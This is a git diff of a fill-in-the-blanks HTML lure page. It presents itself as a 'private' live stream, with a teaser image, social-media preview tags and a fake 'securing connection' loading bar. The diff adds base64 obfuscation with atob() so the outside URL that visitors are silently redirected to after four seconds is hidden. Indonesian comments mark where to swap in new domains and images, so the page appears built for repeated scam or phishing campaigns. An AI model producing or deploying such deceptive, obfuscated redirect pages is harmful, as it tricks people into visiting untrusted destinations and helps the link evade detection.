@@ -1,28 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
+<!-- ================== BASIC ================== -->
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Private Stream</title>
-<meta name="description" content="Watch live update now">
+<!-- ================== EDIT TITLE ================== -->
+<title>Private Access</title>
 
-<!-- OG META -->
-<meta property="og:type" content="website">
-<meta property="og:title" content="🔴 Private Stream Tonight">
-<meta property="og:description" content="Tap to watch now">
-<meta property="og:image" content="https://lovegallery.online/preview.jpg">
+<!-- ================== EDIT DESCRIPTION ================== -->
+<meta name="description" content="Watch private update now">
+
+<!-- ================== THEME ================== -->
+<meta name="theme-color" content="#000000">
+
+<!-- ================== OG META ================== -->
+
+<!-- GANTI JUDUL PREVIEW -->
+<meta property="og:title" content="🔴 Private Access Tonight">
+
+<!-- GANTI DESKRIPSI PREVIEW -->
+<meta property="og:description" content="Tap to continue watching">
+
+<!-- GANTI GAMBAR PREVIEW -->
+<!-- TARUH FILE DI ROOT REPO -->
+<meta property="og:image" content="https://room1.lovegallery.online/preview1.jpg?v=1">
+
 <meta property="og:image:type" content="image/jpeg">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
-<meta property="og:url" content="https://lovegallery.online">
 
+<!-- GANTI DOMAIN -->
+<meta property="og:url" content="https://room1.lovegallery.online/">
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="LoveGallery">
+
+<!-- TWITTER -->
 <meta name="twitter:card" content="summary_large_image">
 
-<!-- PRELOAD -->
+<!-- ================== PRELOAD ================== -->
+
+<!-- GANTI SESUAI GAMBAR -->
 <link rel="preload" as="image" href="/preview1.jpg">
 
 <style>
+
 *{
   margin:0;
   padding:0;
@@ -32,7 +56,8 @@
 body{
   background:#000;
   color:#fff;
-  font-family:Arial, sans-serif;
+  font-family:Arial,sans-serif;
+  width:100%;
   height:100vh;
   overflow:hidden;
 }
@@ -50,10 +75,10 @@ body{
 
 .preview{
   width:100%;
-  max-width:420px;
-  border-radius:16px;
+  max-width:430px;
+  border-radius:18px;
   overflow:hidden;
-  box-shadow:0 0 25px rgba(255,255,255,0.15);
+  box-shadow:0 0 30px rgba(255,255,255,0.12);
 }
 
 .preview img{
@@ -65,59 +90,62 @@ body{
   margin-top:18px;
   font-size:28px;
   font-weight:bold;
+  letter-spacing:1px;
 }
 
 .dot{
-  color:red;
+  color:#ff0000;
   animation:blink 1s infinite;
 }
 
 @keyframes blink{
   50%{
-    opacity:0.3;
+    opacity:0.35;
   }
 }
 
 .loading-box{
+  width:270px;
   margin-top:18px;
-  width:260px;
 }
 
 .loading-text{
   font-size:14px;
+  color:#bdbdbd;
   margin-bottom:10px;
-  color:#ccc;
 }
 
 .bar{
   width:100%;
   height:8px;
-  background:#222;
-  border-radius:10px;
+  background:#1a1a1a;
+  border-radius:20px;
   overflow:hidden;
 }
 
 .fill{
-  height:100%;
   width:0%;
-  background:red;
-  animation:load 5s linear forwards;
+  height:100%;
+  background:#ff0000;
+  animation:load 4s linear forwards;
 }
 
 @keyframes load{
   from{
     width:0%;
   }
+
   to{
     width:100%;
   }
 }
 
 .note{
-  margin-top:15px;
-  color:#999;
+  margin-top:14px;
   font-size:13px;
+  color:#888;
 }
+
 </style>
 </head>
 
@@ -125,22 +153,25 @@ body{
 
 <div class="container">
 
+  <!-- ================== EDIT IMAGE ================== -->
   <div class="preview">
     <img src="/preview1.jpg" alt="Preview">
   </div>
 
   <div class="live">
-    <span class="dot">●</span> LIVE LOADING...
+    <span class="dot">●</span> LIVE CONNECTING...
   </div>
 
   <div class="loading-box">
+
     <div class="loading-text">
-      Connecting secure stream...
+      Securing private connection...
     </div>
 
     <div class="bar">
       <div class="fill"></div>
     </div>
+
   </div>
 
   <div class="note">
@@ -150,9 +181,19 @@ body{
 </div>
 
 <script>
-setTimeout(function(){
-  window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
-}, 5000);
+
+  // ================== ENCODED LINK ==================
+
+  const target = atob(
+    "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk="
+  );
+
+  // ================== REDIRECT TIMER ==================
+
+  setTimeout(() => {
+    window.location.href = target;
+  }, 4000);
+
 </script>
 
 </body>
